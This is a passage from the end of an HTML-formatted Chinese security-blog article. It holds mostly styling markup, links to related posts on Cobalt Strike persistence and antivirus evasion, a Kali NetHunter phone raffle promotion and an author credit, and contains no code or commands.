&quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247486942&amp;idx=1&amp;sn=62f85b29b2518966c6dbd3ea924bb23e&amp;chksm=ec1f58e1db68d1f77eebcc822085ff192d1f4af666da8358293c30eb175353a004a9679f1ae1&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2"><strong>CobaltStrike权限维持及其自动化</strong></a><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247488515&amp;idx=1&amp;sn=76691ac6b8a10471c96d40628be6c41e&amp;chksm=ec1f413cdb68c82a4c9c57d2b3249586836dca92c1a69d5994a5dc58979b8ac164bc436729e5&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2"><strong>干货 | 免杀技术学习路线图</strong></a><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__4" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><span style="color: rgb(255, 104, 39);font-size:15px;line-height:35px;;letter-spacing: 0.544px;"><span style="color: rgb(255, 104, 39);font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.544px;text-align: center;background-color: rgb(255, 255, 255);">本月报名可以参加抽奖送Kali NetHunter手机的优惠活动</span></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__4" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);"><br  /></p><p style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247497897&amp;idx=1&amp;sn=5801b91d451b4c253eb3e2c5ff220673&amp;chksm=ec1cad96db6b2480ce0be49a377819558c06b29603b812512b7cb52ca0c123bc444764f11502&amp;scene=21#wechat_redirect" textvalue="你已选中了添加链接的内容" data-itemshowtype="0" tab="innerlink" data-linktype="1"><span class="js_jump_icon h5_image_link" data-positionback="static" style="inset: auto;margin: 0px;"><img class="rich_pages" data-ratio="0.4255555555555556" data-s="300,640" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/44_1icJc9VoX8KbdFsB6plzmBCTjGDibQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibHHibNbEpsAMia19jkGuuz9tTIfiauo7fjdWicOTGhPibiat3Kt90m1icJc9VoX8KbdFsB6plzmBCTjGDibQ/640?wx_fmt=png'" data-type="png" data-w="900" style="border-width: 0px;border-style: initial;border-color: initial;border-radius: 30px;inset: auto;box-sizing: border-box !important;visibility: visible !important;width: 677px !important;margin: 0px;"></span></a></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__14" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);"><br  /></p><p data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__15" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><span style="font-size:18px;line-height:38px;;color: rgb(255, 104, 39);"><strong>点赞，转发，在看</strong></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;"><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;"><span style="font-size:12px;line-height:32px;;">原创投稿作者：Buffer</span></p><p style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);"><img class="rich_pages __bg_gif" data-ratio="0.5197505197505198" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/45_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" data-type="gif" data-w="962" style="box-sizing: border-box !important;visibility: visible !important;width: 677px !important;"  /></p><section style="line-height: 1.75em;"><br  /></section>
                </div>
</div>
</body>
</html>